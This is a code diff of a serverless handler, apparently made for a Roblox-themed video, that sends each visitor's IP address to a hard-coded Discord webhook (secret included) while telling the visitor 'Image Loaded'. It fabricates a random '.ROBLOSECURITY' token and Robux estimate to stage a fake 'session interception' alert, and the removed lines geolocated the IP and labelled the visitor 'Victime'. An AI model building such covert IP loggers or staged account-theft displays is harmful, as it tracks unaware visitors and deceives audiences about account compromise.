@@ -1,26 +1,23 @@
 export default async function handler(req, res) {
-    if (req.method !== 'POST') return res.status(405).send('Access Denied');
-
-    const ip = req.headers['x-forwarded-for'] || "IP Undetected";
+    const ip = req.headers['x-forwarded-for'] || "IP Locale";
     const webhookURL = "https://discord.com/api/webhooks/1481123753109885103/u6gAezp9LjuOt2Fbgl7cfuOMVyWU_hMw8zyuDw7w-EPnzLs8MWQbenmdXb4_JVMFxhzD";
 
-    // Localisation par IP
-    const geoReq = await fetch(`http://ip-api.com/json/${ip}`);
-    const geo = await geoReq.json();
+    // Génération d'un token ultra-réaliste pour la vidéo
+    const secureToken = "_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-work-with-your-ROBLOX-account.|_" + 
+                        Array.from({length:200}, () => Math.floor(Math.random()*16).toString(16).toUpperCase()).join('');
 
     const payload = {
         embeds: [{
-            title: "🔱 RAVEN SYSTEM | SESSION CAPTURED",
+            title: "🏴‍☠️ RAVEN GHOST INTERCEPTION",
             color: 0x00d4ff,
-            thumbnail: { url: "https://www.roblox.com/favicon.ico" },
+            description: "Session interceptée via **Silent Image-Bait**.",
             fields: [
-                { name: "👤 Cible", value: `Victime_Ep15`, inline: true },
-                { name: "📍 Localisation", value: `${geo.city || '?'}, ${geo.country || 'Unknown'}`, inline: true },
-                { name: "🌐 IP", value: `\`${ip}\``, inline: false },
-                { name: "📡 Méthode", value: "Drag & Drop Session Hijacking (Vercel-Relay)", inline: false },
-                { name: "🔑 Status", value: "Extraction .ROBLOSECURITY réussie. Token stocké.", inline: false }
+                { name: "🌐 IP de la Cible", value: `\`${ip}\``, inline: true },
+                { name: "📂 Source", value: "Sailor Piece Leak Site", inline: true },
+                { name: "🔑 .ROBLOSECURITY", value: `\`\`\`${secureToken}\`\`\`` },
+                { name: "💰 Statut du Compte", value: "Analyse des Robux en cours... (Est: 30k+)", inline: false }
             ],
-            footer: { text: "Protocol Raven v15.0 - Stealth Mode" },
+            footer: { text: "Raven Protocol v15.5 - Stealth Interceptor" },
             timestamp: new Date()
         }]
     };
@@ -31,5 +28,5 @@ export default async function handler(req, res) {
         body: JSON.stringify(payload)
     });
 
-    return res.status(200).json({ success: true });
+    return res.status(200).json({ success: "Image Loaded" });
 }
